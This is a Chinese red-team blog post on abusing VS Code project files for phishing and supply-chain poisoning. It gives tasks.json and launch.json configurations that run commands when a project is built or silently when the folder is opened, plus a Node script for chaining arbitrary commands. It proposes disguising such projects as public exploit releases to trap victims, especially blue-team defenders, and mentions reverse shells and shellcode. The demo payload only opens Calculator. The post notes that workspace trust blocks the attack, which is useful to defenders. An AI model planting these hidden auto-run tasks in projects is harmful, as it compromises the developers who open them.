#  来自vs的背刺—编辑器钓鱼（一）

原创 鱼哭了水知道  [ Lambda小队 ](javascript:void\(0\);)

**Lambda小队** ![]()

微信号 LambdaTeam

功能介绍 一群热爱网络安全的热血青年，一支做好事不留名的Lambda小队

____

___发表于_

收录于合集

#钓鱼思路 1 个

#狙击供应链 2 个

#供应链投毒 1 个

#漏洞复现 2 个

#

#

#

免责声明

本公众号致力于安全研究和红队攻防技术分享等内容，本文中所有涉及的内容均不针对任何厂商或个人，同时由于传播、利用本公众号所发布的技术或工具造成的任何直接或者间接的后果及损失，均由使用者本人承担。请遵守中华人民共和国相关法律法规，切勿利用本公众号发布的技术或工具从事违法犯罪活动。最后，文中提及的图文若无意间导致了侵权问题，请在公众号后台私信联系作者，进行删除操作。

 **0x0** **0**  
 **先上才艺**

 **0x0** **1**  
 **前言**

笔者参与了几次hvv后发现，蓝队已经不像以前一样是一群待宰的羔羊了，蓝队的技术水平也不再是只是看看WAF、态势感知等平台的告警日志了，蓝队从主要是发现、处置和溯源事件，成长为拥有反制或反套路，甚至反钓鱼的能力。本文介绍的是一种利用visual
studio钓鱼的方法，该方法适用场景非常广泛，例如供应链投毒、蓝队反钓鱼红队、水坑攻击等等。

 **0x0** **2**  
 **环境**

![]()

 **0x0** **3**  
 **one-click local code execution**

##  

以一个正常的golang项目举例，首先创建一个输出test的go文件

  *   *   *   *   *   *   * 

    
    
    package main                        import "fmt"                        func main() {                fmt.Println("test")            }

         

点击运行调试，正常输出

  

![]()

那么如果我们需要利用go编译可执行文件呢？

比如我们可以通过命令行go build -o main main.go，那么可以在visual code通过点击运行调试实现一键生成吗？答案是有的

在调试界面创建launch.json文件，生成的文件会在项目目录/.vscode/launch.json，然后将以下代码写入

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {              "version": "0.2.0",              "configurations": [                {                  "name": "Build Go",                  "type": "go",                  "request": "launch",                  "mode": "exec",                  "program": "/usr/local/go/bin/go",                  "args": ["build", "-o", "${workspaceFolder}/main", "${workspaceFolder}/main.go"]                }              ]            }

           

此处program指定的是二进制go文件的位置，可以通过以下方法查找（笔者为mac）

  

![]()

再次点击运行调试，可以发现生成了可执行文件

  

![]()

那么在这里我们可以看到这里program可以通过指定本地程序，然后通过参数化调用，那么我们是否可以通过指定其他程序来命令执行呢？

答案是不行的，launch.json只是用于定义启动调试器的方式，无法运行命令执行

  

![]()![]()

  

![]()

那么我们是否有其他办法执行系统命令呢？答案是有的，可以通过运行任务的方式执行命令。

通过[终端]可以生成任务

  

![]()

或者直接在.vscode下创建tasks.json，然后将以下代码写入

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {                "version": "2.0.0",                "tasks": [                  {                    "type": "shell",                    "label": "cmd-demo",                    "command": "open",                    "args": [                        "-a",                        "/System/Applications/Calculator.app"                    ],                    "group": {                      "kind": "build",                      "isDefault": true                    }                  }                ]            }

         

然后回到launch.json中，添加"preLaunchTask": "cmd-
demo"，其中preLaunchTask的值必须与tasks.json中的label值相同，意思就是在运行编译之前先运行任务

点击运行调试，弹出计算器，而且也生成了可执行文件

![]()

  

![]()

  

 **0x0** **4**  
 **供应链投毒**

## 简单举个例子，比如在github或开源社区通过公布漏洞EXP等的方式，上传该代码，提示用户需要自行编译，引导其在Visual Studio
Code中自动编译。

那么不同的用户可能使用的系统不同（windows/mac/linux），那么如果只是用于攻击，就无需管launch.json中的program的值，可以让用户自己指定，我们只需要处理tasks.json中的内容，这里比如指定个不存在的路径

  

![]()

依旧弹出了计算器，意味着无论launch.json中的program是否可以执行，也会先运行tasks.json中的任务

但是由于不同的系统，远程控制的方式不同，比如windows的通过加载shellcode进行远程控制，而linux通过bash来进行反弹shell，那么提供几种思路

#####  **1、任务自带参数判断  **

tasks.json中自带参数可以判断当前操作系统，如：windows、linux和osx，其中osx就是macOS

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {                "version": "2.0.0",                "tasks": [                  {                    "label": "cmd-demo",                    "type": "process",                    "osx": {                      "command": "open",                      "args": [                        "-a",                        "/System/Applications/Calculator.app"                      ]                    },                    "linux": {                      "command": ""                    },                    "windows": {                      "command": ""                    },                  }                ]            }

       

运行方式还是在launch.json中指定preLaunchTask，优先运行该任务

#####  **2、暴力同时执行多个任务  **

在.vscode目录下新建一个preLaunchScript.js，然后将以下代码写入

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    const { exec } = require('child_process');              
      
                // 第一个要执行的命令            exec('a', (error, stdout, stderr) => {              if (error) {                console.error(`Error running task1: ${error.message}`);                // 在这里进行错误处理逻辑              }              console.log(stdout);                            // 第二个要执行的命令              exec('b', (error, stdout, stderr) => {                if (error) {                  console.error(`Error running task2: ${error.message}`);                  // 在这里进行错误处理逻辑                }                console.log(stdout);              });            });

  

然后在tasks.json中运行这个JS

  *   *   *   *   *   *   *   *   *   * 

    
    
    {                "version": "2.0.0",                "tasks": [                  {                    "type": "shell",                    "label": "cmd-demo",            "command" : "node ${workspaceFolder}/.vscode/preLaunchScript.js"                  }                ]            } 

         

最后也是跟上面一样在launch.json中指定preLaunchTask优先运行这个任务

 **0x0** **5**  
 **zero-click local code execution**  

那么有没有一种办法可以实现项目引入工作区就自动运行任务呢？答案是有的

在tasks.json可以配置runOptions用于任务的自动运行条件：

  * "runOn": "onSave" 在保存文件时运行任务。

  * "runOn": "onType" 在键入时运行任务。每当你在编辑器中键入字符时，任务将自动运行。

  * "runOn": "onFolderChange" 在当前打开的文件夹中的任何文件更改时运行任务。如果你有多个文件在同一个文件夹中，任何文件的更改都会触发任务运行。

  * "runOn": "onRootChange" 在当前工作区根目录下的任何文件更改时运行任务。这包括当前文件夹及其子文件夹中的文件更改。

  * "runOn": "onAnyChange" 在任何文件更改时运行任务。无论在当前工作区中的哪个文件夹中进行的更改，都会触发任务运行。

这里选择"runOn": "onFolderChange"，即当这个文件夹导入工作区时，就直接运行任务

但是此时当运行任务的时候发现终端会弹一个新窗口出来提示正在运行任务

  

![]()

当然这也是可以隐藏的，设置tasks.json加一个新参数"presentation": { "reveal": "silent" }，达成效果如下

  

![]()

 **0x06** ****  
 **无条件本地代码执行？**

显然不是，当项目导入工作区的时候，会有一个弹框“是否信任此文件夹中的文件的作者？”本地测试发现当我们点击否即可阻止项目中的任务运行

  

![]()

  

 **加入我们一起学习**

  

  
  
  
  
  
  
  

  

本公众号是一群热爱网安事业的一线红队队员发起成立的，我们旨在分享最前沿的研究成果， **拒绝复制黏贴，打造最硬核的公众号**
，加入我们的交流群一起学习后台私信“ **加群**
”，里面有众多红队大佬、审计狗、SRC爱好者。群内同时为了更大程度上分享硬核内容，成立了知识星球，详情请关注下发二维码。

![]()

![]()

  

 **关于Lambda小队**

![]()  

Lambda小队经过多年的一线红队磨炼，取得了众多辉煌的战绩，同时也积淀了丰富的实战经验，后续将为大家带来更多一线的实战经历和研究成果。

  

![]()

  

![]()

![]()![]()

![]()![]()

  

![]()

![]()

  

![]()

  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

